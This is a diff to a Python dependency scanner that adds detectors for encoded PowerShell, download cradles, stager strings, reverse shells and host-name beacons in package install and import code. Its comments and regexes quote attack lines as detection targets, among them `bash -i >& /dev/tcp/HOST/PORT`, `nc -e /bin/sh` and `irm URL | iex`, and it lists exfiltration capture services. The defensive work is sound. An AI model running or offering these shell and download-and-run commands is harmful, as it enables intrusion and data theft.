@@ -34,6 +34,7 @@ the same only with --strict-taint-config.
 No dependencies — runs on stock python3. Same ruleset as the Lazaret dashboard.
 """
 import argparse
+import base64
 import bisect
 import collections
 import datetime
@@ -4282,10 +4283,43 @@ def _joined_eval_decode(ctx, i, rule_re):
 # RegExp.prototype.exec (the `for (re.lastIndex = 0; (m = re.exec(t));)`
 # loop of every bundler's output), `session.exec(q)` a database call. The
 # other sink names are distinctive and count on any receiver.
-_DECODE_CALL_RE = re.compile(
+_DECODE_CALL_SRC = (
     r"(?:\batob|\bb64decode|\.\s*fromhex|\bunhexlify|\b" + _module_ref("codecs") + r"\s*\.\s*decode"
-    r"|\b" + _module_ref("zlib") + r"\s*\.\s*decompress)\s*\("
+    r"|\b" + _module_ref("zlib") + r"\s*\.\s*decompress|\.\s*decrypt)\s*\("
     r"|\bBuffer\s*\.\s*from\s*\([^;\n]{0,300}?['\"`]base64['\"`]")
+_DECODE_CALL_RE = re.compile(_DECODE_CALL_SRC)
+# A decoder imported under another name, whose calls decode too: `from base64
+# import b64decode as invoke` then `exec(invoke('aW1w…'))` hid a payload from
+# the decode flow in two malicious PyPI packages. (`.decrypt(` — a Fernet or
+# AES cipher's — is a decode call of its own: `exec(Fernet(k).decrypt(t))`.)
+_DECODER_IMPORT_RE = re.compile(
+    r"^[ \t]*from[ \t]+(?:base64|binascii|codecs|zlib|marshal|bz2|lzma|gzip)[ \t]+import[ \t]+([^\n#]{1,300})", re.M)
+_DECODER_NAMES = frozenset((
+    "b64decode", "b32decode", "b85decode", "a85decode", "decodebytes", "standard_b64decode", "urlsafe_b64decode",
+    "unhexlify", "a2b_base64", "a2b_hex", "decode", "decompress", "loads"))
+_PLAIN_NAME_RE = re.compile(r"^[A-Za-z_][A-Za-z0-9_]*$")
+
+
+def _decoder_aliases(text):
+    """Names a Python file binds to a decoder with `from … import d as name`."""
+    out = []
+    if "import" not in text or " as " not in text:
+        return out
+    for m in _DECODER_IMPORT_RE.finditer(text):
+        for part in m.group(1).replace("(", " ").replace(")", " ").split(","):
+            bits = part.split()
+            if (len(bits) == 3 and bits[1] == "as" and bits[0] in _DECODER_NAMES
+                    and _PLAIN_NAME_RE.match(bits[2]) and bits[2] not in out):
+                out.append(bits[2])
+    return out[:20]
+
+
+def _file_decode_re(content):
+    """_DECODE_CALL_RE, with the calls of the file's decoder aliases."""
+    aliases = _decoder_aliases(content)
+    if not aliases:
+        return _DECODE_CALL_RE
+    return re.compile(_DECODE_CALL_SRC + r"|(?<![\w.])(?:" + "|".join(aliases) + r")\s*\(")
 # The receiver starts at an identifier boundary: without (?<![\w$]) every
 # position inside a long identifier retried the whole rest of it ('a' * 20,000
 # on one line: 4.8 s).
@@ -4367,6 +4401,7 @@ def _dep_decode_flow(path, ctx, issues):
     cp_aliases = _child_process_aliases(ctx.content) if ctx.lang == "js" else frozenset()
     decoded = {}                      # name -> (line of the decode, its offset in the file)
     offset = 0                        # offset of line i in the file
+    decode_re = _file_decode_re(ctx.content) if ctx.lang == "py" else _DECODE_CALL_RE
     for i in range(len(ctx.lines)):
         base, offset = offset, offset + len(ctx.lines[i]) + 1
         if ctx.cmask[i]:
@@ -4376,7 +4411,7 @@ def _dep_decode_flow(path, ctx, issues):
             continue
         if not i & 63:
             ctx.check_time()
-        has_decode = _DECODE_CALL_RE.search(code) is not None
+        has_decode = decode_re.search(code) is not None
         if not decoded and not has_decode:
             continue
         blank = _blank_strings(code)
@@ -4398,7 +4433,7 @@ def _dep_decode_flow(path, ctx, issues):
             at = base + pos
             if kind == 0:
                 a, b = m.span(2)
-                if _DECODE_CALL_RE.search(code, a, b):
+                if decode_re.search(code, a, b):
                     decoded[m.group(1)] = (i + 1, at)
                     continue
                 src = live(a, b, at)
@@ -4422,7 +4457,7 @@ def _dep_decode_flow(path, ctx, issues):
             if src:
                 msg = (f"Decoded payload (assigned at line {min(d[0] for d in src)}) "
                        f"reaches a code-execution sink.")
-            elif _DECODE_CALL_RE.search(code, m.end(), end):
+            elif decode_re.search(code, m.end(), end):
                 msg = "Decoded payload reaches a code-execution sink in the same call."
             else:
                 continue
@@ -5382,6 +5417,173 @@ _DL_CATEGORY_REASON = {
 }
 
 
+# ---------------- PowerShell, stagers, reverse shells, host information ----------------
+# The install-script blind spots of the audit's PyPI benchmark (0.1.7), each a
+# shape a legitimate install script has no use for:
+#
+# * PowerShell started with an encoded command (-EncodedCommand, or any prefix
+#   PowerShell accepts: -e, -ec, -enc, …; base64 of UTF-16LE text): 68 of 200
+#   malicious PyPI packages ran `powershell -WindowStyle Hidden -EncodedCommand
+#   …` from setup.py to fetch an .exe from Discord's CDN and start it. The
+#   command is decoded, and what it does is named when it downloads and runs
+#   code. Plain PowerShell that downloads and runs code — a cradle (`irm URL |
+#   iex`, `IEX (New-Object Net.WebClient).DownloadString(URL)`) or a download
+#   written to a file and started (`Invoke-WebRequest -OutFile f` then
+#   `Start-Process f`) — is the same thing unencoded.
+# * A script carried in a string literal that downloads and runs code: a
+#   setup.py that writes `b"""from urllib.request import urlopen as u;exec(u(
+#   'https://…').read())"""` to a temporary file and starts it with pythonw.
+#   The literal's text is read as code (its `;`-separated statements one per
+#   line) by the received-code test.
+# * A reverse shell: a socket's descriptor made a shell's standard streams
+#   (`os.dup2(s.fileno(), 0)` … `subprocess.call(["/bin/sh", "-i"])`),
+#   `bash -i >& /dev/tcp/HOST/PORT 0>&1`, `nc -e /bin/sh`, or a spawned shell
+#   piped to a net.Socket.
+# * The machine's user or host name (or the output of whoami, hostname,
+#   ifconfig …) collected in a script that sends data over the network: the
+#   dependency-confusion beacon.
+_PS_RE = re.compile(r"\b(?:powershell|pwsh)(?:\.exe)?\b", re.I)
+_PS_ENCODED_RE = re.compile(
+    r"\b(?:powershell|pwsh)(?:\.exe)?\b[^\n]{0,400}?[\s\"',\[(][-/\u2013\u2014]"
+    r"(?:encodedcommand|encodedcomman|encodedcomma|encodedcomm|encodedcom|encodedco|encodedc|encoded|encode"
+    r"|encod|enco|enc|en|ec|e)[\s\"',]+([A-Za-z0-9+/]{16}[A-Za-z0-9+/]*={0,2})", re.I)
+_PS_ENCODED_MAX = 65536          # base64 characters of one command that are decoded
+_PS_CRADLE_RE = re.compile(
+    r"\b(?:iwr|irm|Invoke-WebRequest|Invoke-RestMethod|curl|wget)\b[^\n|;]{0,400}\|\s*(?:iex|Invoke-Expression)\b"
+    r"|\b(?:iex|Invoke-Expression)\b[\s(]{0,8}(?:New-Object\s+(?:System\.)?Net\.WebClient\s*\)\s*\.\s*DownloadString"
+    r"|iwr|irm|Invoke-WebRequest|Invoke-RestMethod)\b"
+    r"|\.DownloadString\s*\([^\n)]{0,400}\)\s*\|\s*(?:iex|Invoke-Expression)\b", re.I)
+_PS_DOWNLOAD_FILE_RE = re.compile(
+    r"\b(?:Invoke-WebRequest|iwr|Invoke-RestMethod|irm|curl(?:\.exe)?|wget|Start-BitsTransfer)\b[^\n]{0,400}?"
+    r"\s-(?:OutFile|Destination|o)\b|\.DownloadFile\s*\(", re.I)
+_PS_START_RE = re.compile(r"\b(?:Start-Process|saps|Invoke-Item|Invoke-Expression|iex)\b", re.I)
+
+
+def _powershell_script_risk(ps):
+    """What PowerShell text `ps` does that an install script should not:
+    'downloads and runs code' or None."""
+    if _PS_CRADLE_RE.search(ps) or (_PS_DOWNLOAD_FILE_RE.search(ps) and _PS_START_RE.search(ps)):
+        return "downloads and runs code"
+    return None
+
+
+def _decode_powershell(b64):
+    """The UTF-16LE text of an -EncodedCommand argument ('' when it is not
+    base64): the first _PS_ENCODED_MAX characters, padded, an odd last byte
+    dropped."""
+    b64 = b64[:_PS_ENCODED_MAX]
+    b64 = b64[:len(b64) - len(b64) % 4] if b64.endswith("=") else b64 + "=" * (-len(b64) % 4)
+    try:
+        data = base64.b64decode(b64, validate=True)
+    except (ValueError, TypeError):
+        return ""
+    return data[:len(data) // 2 * 2].decode("utf-16-le", "replace")
+
+
+def powershell_risk(text):
+    """Reasons PowerShell in `text` looks hostile (see above), [] if none."""
+    if not _PS_RE.search(text):
+        return []
+    reasons = []
+    for m in _PS_ENCODED_RE.finditer(text):
+        does = _powershell_script_risk(_decode_powershell(m.group(1)))
+        reasons.append("runs an encoded PowerShell command" + (f" that {does}" if does else ""))
+        break
+    if not reasons:
+        does = _powershell_script_risk(text)
+        if does:
+            reasons.append(f"runs PowerShell that {does}")
+    return reasons
+
+
+_STAGER_MIN = 24                 # characters of a literal worth reading as a script
+_STAGER_MAX_LITERALS = 2000      # literals examined per text
+_STAGER_RUN_NEEDLES = ("exec", "eval", "Function", "system", "popen", "spawn", "-c")
+_STAGER_NET_NEEDLES = ("urlopen", "requests", "urllib", "http", "fetch", "curl", "wget", "socket")
+
+
+def _string_literals(text):
+    """(offset, contents) of the string literals of `text` ('…', "…", `…`
+    and Python's triple-quoted forms; escapes are skipped, not decoded; a
+    one-quote literal ends at its line), in order, at most
+    _STAGER_MAX_LITERALS of them. One pass."""
+    out, i, n = [], 0, len(text)
+    while i < n and len(out) < _STAGER_MAX_LITERALS:
+        ch = text[i]
+        if ch not in "\"'`":
+            i += 1
+            continue
+        if ch != "`" and text.startswith(ch * 3, i):
+            j = text.find(ch * 3, i + 3)
+            end = n if j < 0 else j
+            out.append((i, text[i + 3:end]))
+            i = end + 3
+            continue
+        j = i + 1
+        while j < n and text[j] != ch and (ch == "`" or text[j] != "\n"):
+            j += 2 if text[j] == "\\" else 1
+        out.append((i, text[i + 1:min(j, n)]))
+        i = j + 1
+    return out
+
+
+def stager_at(text):
+    """The offset of a string literal of `text` that holds a script that
+    downloads and runs code (see above), else -1."""
+    if not any(nd in text for nd in _STAGER_NET_NEEDLES):
+        return -1
+    for at, lit in _string_literals(text):
+        if (len(lit) >= _STAGER_MIN and any(nd in lit for nd in _STAGER_RUN_NEEDLES)
+                and any(nd in lit for nd in _STAGER_NET_NEEDLES)):
+            found = _received_code_kind(lit.replace(";", "\n"))
+            if found is not None and found[1] == "run":
+                return at
+    return -1
+
+
+_REVSHELL_DUP2_RE = re.compile(r"\bdup2\s*\(\s*[\w.]+\.fileno\s*\(\s*\)\s*,\s*[012]\s*\)")
+_REVSHELL_SHELL_RE = re.compile(r"""["'](?:/bin/(?:ba|z|da|k)?sh|cmd(?:\.exe)?|powershell(?:\.exe)?)["']|\bpty\.spawn\s*\(""")
+_REVSHELL_LINE_RE = re.compile(
+    r"\b(?:ba|z|k)?sh\s+-i\b[^\n]{0,80}?[<>]&?\s*/dev/(?:tcp|udp)/"
+    r"|/dev/(?:tcp|udp)/[\w.\-]+/\d+[^\n]{0,40}?0\s*>\s*&\s*1"
+    r"|\b(?:nc|ncat|netcat)\b[^\n]{0,120}?\s-[ec]\s+[\"']?(?:/bin/)?(?:ba|z)?sh\b")
+_REVSHELL_JS_SPAWN_RE = re.compile(r"""\bspawn\s*\(\s*["'](?:/bin/(?:ba|z)?sh|cmd(?:\.exe)?)["']""")
+_REVSHELL_JS_PIPE_RE = re.compile(r"\.pipe\s*\(\s*[\w$.]+\.stdin\s*\)")
+_REVSHELL_JS_NET_RE = re.compile(r"\bnet\s*\.\s*(?:Socket|connect|createConnection)\b|\bnew\s+Socket\s*\(")
+
+
+def reverse_shell_at(text):
+    """The offset where `text` opens a reverse shell (see above), else -1."""
+    m = _REVSHELL_LINE_RE.search(text)
+    if m:
+        return m.start()
+    if "dup2" in text:
+        m = _REVSHELL_DUP2_RE.search(text)
+        if m and _REVSHELL_SHELL_RE.search(text):
+            return m.start()
+    if "pty" in text and "socket" in text and "connect" in text and "pty.spawn" in text:
+        return text.index("pty.spawn")
+    if "spawn" in text:
+        m = _REVSHELL_JS_SPAWN_RE.search(text)
+        if m and _REVSHELL_JS_PIPE_RE.search(text) and _REVSHELL_JS_NET_RE.search(text):
+            return m.start()
+    return -1
+
+
+_HOST_INFO_RE = re.compile(
+    r"\b(?:socket\.gethostname|socket\.getfqdn|platform\.node|getpass\.getuser|os\.getlogin|pwd\.getpwuid"
+    r"|os\.hostname|os\.userInfo)\s*\("
+    r"""|\b(?:getoutput|check_output|getstatusoutput|execSync|popen)\s*\(\s*\[?\s*["'](?:whoami|hostname|id|uname"""
+    r"""|ifconfig|ipconfig|systeminfo)\b"""
+    r"|(?:\$\(|`)\s*(?:whoami|hostname|id|uname|ifconfig|ip\s+a|pwd|ls|cat\s+/etc/passwd|ps)\b")
+
+
+def sends_host_info(text):
+    """True when `text` collects the machine's user or host name (or runs
+    whoami, hostname, ifconfig …) and sends data over the network."""
+    return bool(_HOST_INFO_RE.search(text) and (_NETWORK_RE.search(text) or _EXFIL_SERVICE_RE.search(text)))
+
+
 def install_script_risk(text):
     """Reasons an install-time script looks hostile ([] if none)."""
     reasons = []
@@ -5400,6 +5602,13 @@ def install_script_risk(text):
         reasons.append(_DL_CATEGORY_REASON["run"])
     elif received is not None:
         reasons.append(_DL_CATEGORY_REASON[received[1]])
+    reasons.extend(powershell_risk(text))
+    if (received is None or received[1] != "run") and not substituted and stager_at(text) >= 0:
+        reasons.append("carries a script that downloads and runs code")
+    if reverse_shell_at(text) >= 0:
+        reasons.append("opens a reverse shell")
+    if sends_host_info(text):
+        reasons.append("sends the machine's user or host name over the network")
     return reasons
 
 
@@ -5436,16 +5645,174 @@ _EXEC_CALL_RE = re.compile(
 _IMPORT_HARVEST_NEEDLES = ("process.env", "os.environ", "id_", ".git-credentials", "leveldb")
 
 
-def import_time_risk(text):
+# Import-time code that is SUSPICIOUS on its own (audit P0, 0.1.7): the
+# test above stays MAJOR for what ordinary code can share (a download written
+# to a file and run is a prebuilt-binary installer's shape; whole-environment
+# reads meet network code in SDKs), but these reasons are CRITICAL wherever
+# they are found — fetch-and-run and the other shapes install_script_risk
+# names that no library needs: code received over the network and run, a
+# download run through a shell, PowerShell that hides or fetches what it
+# runs, a stager string, a reverse shell, credentials or the environment
+# sent to a named exfiltration service, the machine's user or host name sent
+# to a data-capture service (the dependency-confusion beacon), and a
+# download run with the Python interpreter (a script, not a binary).
+_STRONG_IMPORT_REASONS = (
+    "runs code it receives over the network", "runs a downloaded script through a shell",
+    "runs an encoded PowerShell command", "runs PowerShell that", "carries a script that downloads and runs code",
+    "opens a reverse shell", "reads credentials or the whole environment and sends them to",
+    "sends the machine's user or host name to a data-capture service", "downloads a script and runs it with Python")
+# Endpoints that exist to capture what is sent to them (out-of-band testing,
+# request inspection): no library reports to one
+_CAPTURE_SERVICE_RE = re.compile(
+    r"webhook\.site|typedwebhook\.tools|oastify\.com|burpcollaborator|\binteract\.sh|\boast[\w.-]*\.(?:pro|live|site"
+    r"|online|fun|me|com)\b|pipedream\.net|requestbin|requestcatcher\.com|hookbin\.com|postb\.in|beeceptor\.com"
+    r"|dnslog\.cn|ceye\.io|canarytokens", re.I)
+_PY_RUN_RE = re.compile(
+    r"""\[\s*(?:sys\.executable|["']python[\d.w]*(?:\.exe)?["'])\s*,|\bstart\s+pythonw?\b"""
+    r"""|\b(?:system|popen|getoutput|run|call|Popen)\s*\(\s*f?["']python[\d.w]*(?:\.exe)?\s""")
+
+# Prose is not import-time code (0.1.7). On the audit's benign PyPI corpus a
+# CLI's docstring showed `powershell -c "irm … | iex"` and a comment quoted
+# `iwr … | iex` (huggingface-hub), and a docstring named ``id_rsa``
+# (paramiko). A Python or JavaScript file that fails the test is read again
+# with its comments blanked and, in Python, the string literals that stand
+# alone as statements (docstrings, strings used as block comments) — not in
+# a file that reads its own __doc__, which can hand one to exec. The text
+# keeps its line breaks and one character per character, so lines and the
+# patterns' bounds are the file's. PowerShell counts at import time only as
+# an argument of an exec call (`os.system('powershell …')`,
+# `subprocess.run(["pwsh", …])`, over lines): a CLI's self-update code
+# builds the command in one function and runs it in another, and its help
+# text shows one. Both are the test's rule for a download piped into a shell.
+_PY_DOC_HEAD_RE = re.compile(r"[ \t]*[rRuUbB]{0,2}\Z")   # what may precede a statement string on its line
+_PY_JOINS = "([{,=+-*/%&|^<>~@\\.\"'"   # code a string on the next line continues (or joins, as a literal)
+_BRACKET_RE = re.compile(r"[()\[\]{}]")
+_SPACE_TAB_RE = re.compile(r"[ \t]*")
+_PS_EXEC_BACK = 300              # characters before a PowerShell name searched for the exec call it is in
+_PS_EXEC_MAX_NAMES = 200         # PowerShell names examined per text
+
+
+def _py_statement_literals(text, literals, comments):
+    """The spans of `literals` (the lexer's) that stand alone as statements:
+    a string, not an f-string, that begins its line outside brackets, after
+    code that does not continue into it (a backslash, an operator, an open
+    bracket, a comma or another string), with nothing but a comment after it
+    on its line. One pass: each character is read a bounded number of times,
+    however long its line."""
+    out = []
+    marks = sorted([(s, e, True) for s, e in literals] + [(s, e, False) for s, e in comments])
+    depth, pos, last = 0, 0, ""        # bracket depth, end of the last mark, last code character
+    for s, e, is_literal in marks:
+        if s < pos:
+            continue
+        k = text.rfind("\n", pos, s)
+        ls = k + 1 if k >= 0 else (0 if pos == 0 else -1)     # -1: a mark before it on its line
+        prior = last                   # the last code character before the literal's line
+        if ls > pos:
+            code = text[pos:ls].rstrip()
+            if code:
+                prior = code[-1]
+        gap = text[pos:s]
+        for b in _BRACKET_RE.finditer(gap):
+            depth = depth + 1 if b.group() in "([{" else max(0, depth - 1)
+        code = gap.rstrip()
+        if code:
+            last = code[-1]
+        pos = e
+        if not is_literal:
+            continue
+        if e > s:
+            last = text[e - 1]
+        j = _SPACE_TAB_RE.match(text, e).end()
+        if (ls >= 0 and depth == 0 and (not prior or prior not in _PY_JOINS) and _PY_DOC_HEAD_RE.match(text, ls, s)
+                and not (ls >= 2 and text[ls - 2] == "\\") and (j == len(text) or text[j] in "\n#")):
+            out.append((s, e))
+    return out
+
+
+def _blank(text, spans):
+    """`text` with the characters of `spans` (sorted, disjoint) made spaces,
+    its line breaks kept."""
+    if not spans:
+        return text
+    parts, p = [], 0
+    for s, e in spans:
+        s = max(s, p)
+        if e <= s:
+            continue
+        parts.append(text[p:s])
+        parts.append("\n".join(" " * len(row) for row in text[s:e].split("\n")))
+        p = e
+    parts.append(text[p:])
+    return "".join(parts)
+
+
+def _import_code(text, lang):
+    """`text` (a Python or JavaScript file) with its prose blanked (see
+    above)."""
+    literals = [] if lang == "py" and "__doc__" not in text else None
+    comments = _lex_comment_spans(text, lang, literals=literals)
+    spans = list(comments)
+    if literals:
+        spans = sorted(spans + _py_statement_literals(text, literals, comments))
+    return _blank(text, spans)
+
+
+def _call_open(rest):
+    """Is a call whose '(' comes just before `rest` still open at its end?"""
+    depth = 1
+    for b in _BRACKET_RE.finditer(rest):
+        depth += 1 if b.group() in "([{" else -1
+        if depth == 0:
+            return False
+    return True
+
+
+def _powershell_run_at(text):
+    """The offset of the first PowerShell name of `text` that is an argument
+    of an exec call opened at most _PS_EXEC_BACK characters before it, else
+    -1 (at most _PS_EXEC_MAX_NAMES names are examined)."""
+    for k, m in enumerate(_PS_RE.finditer(text)):
+        if k >= _PS_EXEC_MAX_NAMES:
+            break
+        window = text[max(0, m.start() - _PS_EXEC_BACK):m.start()]
+        if any(_call_open(window[c.end():]) for c in _EXEC_CALL_RE.finditer(window)):
+            return m.start()
+    return -1
+
+
+def import_time_severity(reasons):
+    """'CRITICAL' when one of `reasons` (import_time_risk's) is a strong one
+    (see _STRONG_IMPORT_REASONS), else 'MAJOR'."""
+    return "CRITICAL" if any(r.startswith(_STRONG_IMPORT_REASONS) for r in reasons) else "MAJOR"
+
+
+def import_time_risk(text, lang=None):
     """-> (reasons, line): why code that runs on import looks hostile by
     the weaker test above ([] if not), and the 1-based line of the first
-    sign. `text` has \\n line endings."""
+    sign. `text` has \\n line endings; `lang` 'py' or 'js' reads it without
+    its prose (see _import_code). import_time_severity grades them."""
+    reasons, line = _import_time_risk(text)
+    if reasons and lang in ("py", "js"):
+        code = _import_code(text, lang)
+        if code != text:
+            reasons, line = _import_time_risk(code)
+    return reasons, line
+
+
+def _import_time_risk(text):
     reasons, line = [], None
     harvest = (_IMPORT_HARVEST_RE.search(text)
                if any(needle in text for needle in _IMPORT_HARVEST_NEEDLES) else None)
-    if harvest and (_NETWORK_RE.search(text) or _EXFIL_SERVICE_RE.search(text)):
-        reasons.append("reads credentials or the whole environment and sends data over the network")
-        line = text.count("\n", 0, harvest.start()) + 1
+    if harvest:
+        service = _EXFIL_SERVICE_RE.search(text)
+        if service:
+            reasons.append("reads credentials or the whole environment and sends them to "
+                           f"an exfiltration service ({service.group(0)[:40]})")
+        elif _NETWORK_RE.search(text):
+            reasons.append("reads credentials or the whole environment and sends data over the network")
+        if reasons:
+            line = text.count("\n", 0, harvest.start()) + 1
     if "curl" in text or "wget" in text:
         for i, row in enumerate(text.split("\n")):
             if _runs_download_through_shell(row):
@@ -5458,8 +5825,31 @@ def import_time_risk(text):
         line = line or received[0]
     dropped = _downloads_and_runs_file(text)
     if dropped is not None:
-        reasons.append("downloads a file and then runs it")
+        reasons.append("downloads a script and runs it with Python" if _PY_RUN_RE.search(text)
+                       else "downloads a file and then runs it")
         line = line or dropped
+    signs = []                        # (offset, reason) of the shapes no library needs
+    ps = powershell_risk(text)
+    if ps:
+        at = _powershell_run_at(text)
+        if at >= 0:
+            signs.append((at, ps[0]))
+    if received is None or received[1] != "run":
+        at = stager_at(text)
+        if at >= 0:
+            signs.append((at, "carries a script that downloads and runs code"))
+    at = reverse_shell_at(text)
+    if at >= 0:
+        signs.append((at, "opens a reverse shell"))
+    host = _HOST_INFO_RE.search(text)
+    if host:
+        capture = _CAPTURE_SERVICE_RE.search(text)
+        if capture:
+            signs.append((host.start(), "sends the machine's user or host name to a data-capture service "
+                                        f"({capture.group(0)[:40]})"))
+    for at, reason in signs:
+        reasons.append(reason)
+        line = line or text.count("\n", 0, at) + 1
     return reasons, line
 
 
@@ -6435,7 +6825,8 @@ def _dl_region_names_path(region, path):
 
 def _downloads_and_runs_file(text):
     """The 1-based line where a received value is written to a file that is then
-    run (see the section comment), else None. MAJOR only."""
+    run (see the section comment), else None. MAJOR only, except in the Python
+    code pip runs to install an sdist (the registry)."""
     if (not any(n in text for n in _DL_NEEDLES) or not any(n in text for n in _DL_FILE_WRITE_NEEDLES)
             or not any(n in text for n in _DL_PATHRUN_NEEDLES)):
         return None
@@ -8152,7 +8543,8 @@ def _xf_issue(path, line, text, cat, srcs):
     msg = (f"Dependency code {_DL_CATEGORY_REASON[cat]}; the value is received in "
            f"another file of the package ({where}).")
     return mk_issue(
-        {"id": "SC-IMPORT-RISK", "name": "Risky import-time code", "type": "HOTSPOT", "sev": "MAJOR",
+        {"id": "SC-IMPORT-RISK", "name": "Risky import-time code", "type": "HOTSPOT",
+         "sev": import_time_severity([_DL_CATEGORY_REASON[cat]]),
          "msg": msg, "why": _DEP_IMPORT_RISK_WHY,
          "fix": f"Read both files: what does {where} receive, and what runs it here?",
          "ref": "CWE-506 · Supply chain"}, path, line, lines, redactor=_Redactor(lines))
@@ -8498,7 +8890,7 @@ def dependency_checks(root, files, manifests, issues, excludes=(), should_stop=N
             if stopped:
                 return out, extra, stopped
         try:
-            found = dependency_import_issue(f["path"], f["content"])
+            found = dependency_import_issue(f["path"], f["content"], f["lang"])
             agent = dependency_agent_issue(f["path"], f["content"])
         except Exception as exc:
             found, agent = scan_error_issue(f["path"], exc), None
@@ -8624,15 +9016,17 @@ def _read_dependency_script(tree, rel, as_lang, out, extra):
     return text
 
 
-def dependency_import_issue(path, text):
-    """SC-IMPORT-RISK (MAJOR) for a dependency's JavaScript or Python file
-    that fails the import-time test (import_time_risk), else None."""
-    reasons, line = import_time_risk(text)
+def dependency_import_issue(path, text, lang=None):
+    """SC-IMPORT-RISK (MAJOR, or CRITICAL: import_time_severity) for a
+    dependency's JavaScript or Python file (`lang` 'js' or 'py') that fails
+    the import-time test (import_time_risk), else None."""
+    reasons, line = import_time_risk(text, lang)
     if not reasons:
         return None
     lines = text.split("\n")
     return mk_issue(
-        {"id": "SC-IMPORT-RISK", "name": "Risky import-time code", "type": "HOTSPOT", "sev": "MAJOR",
+        {"id": "SC-IMPORT-RISK", "name": "Risky import-time code", "type": "HOTSPOT",
+         "sev": import_time_severity(reasons),
          "msg": f"Dependency code {'; and '.join(reasons)}.", "why": _DEP_IMPORT_RISK_WHY,
          "fix": "Read the file: what does it collect, and where does it send it?",
          "ref": "CWE-506 · Supply chain"}, path, line, lines, redactor=_Redactor(lines))
